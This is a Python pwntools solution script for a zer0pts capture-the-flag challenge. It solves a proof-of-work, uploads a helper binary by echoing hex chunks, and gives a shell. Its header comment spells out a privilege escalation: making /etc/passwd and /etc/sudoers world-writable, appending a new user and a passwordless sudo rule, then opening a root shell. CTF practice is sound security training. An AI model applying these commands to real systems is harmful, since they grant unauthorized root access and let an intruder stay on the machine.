###########################################################################
# solution:
#
# send over compiled connect program
# chmod +x /tmp/connect
# /tmp/connect /etc/passwd 511 (this is octal 777 permissions in decimal)
# echo "sudo:x:1000:1000:sudo:/home:/bin/sh" >> /etc/passwd
# /tmp/connect /etc/passwd 420 (*nice) (decimal of octal 644)
# /tmp/connect /etc/sudoers 511 (777 again)
# echo "%sudo ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
# /tmp/connect /etc/sudoers 288 (decimal of octal 440)
# sudo /bin/sh
# # # # (we're in)
#     cd /root
#     ls
#     cat flag-*.txt
###########################################################################

from pwn import *
import itertools
import hashlib
import string
import binascii

def drop_file(remote_pwn,filename,dest):
    with open(filename,'rb') as fp:
        data = fp.read()
    data = binascii.b2a_hex(data)
    pieces = [data[i:i+450] for i in range(0, len(data), 450)]
    for i,piece in enumerate(pieces):
        piece = str(piece)[2:-1]
        piece = '\\x' + '\\x'.join(a+b for a,b in zip(piece[::2],piece[1::2]))
        ret = f"echo -n -e '{piece}' >> {dest}"
        remote_pwn.sendline(ret)
        print(f"sending {filename} [{i+1}/{len(pieces)}]")
        remote_pwn.recvuntil('/ $ ')

table = string.ascii_letters + string.digits + "._"

# b4ckd00r:/root:777
try:
    # try first server
    p = remote('any.ctf.zer0pts.com',11011)
    data = p.recvline().decode().split('=')
except(EOFError):
    # if that fails, go to the other one
    p = remote('others.ctf.zer0pts.com',11011)
    data = p.recvline().decode().split('=')
hashval = data[1].strip()
suffix = data[0].split('????')[1].split('"')[0]
print("solving...")
for v in itertools.product(table, repeat=4):
    if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
        print("[+] Prefix = " + ''.join(v))
        prefix = ''.join(v)
        break
else:
    print("[-] Solution not found :thinking_face:")
p.sendline(prefix)
p.recvuntil('/ $ ')
print("[ connected ]")
drop_file(p,'connect','/tmp/connect')
p.interactive()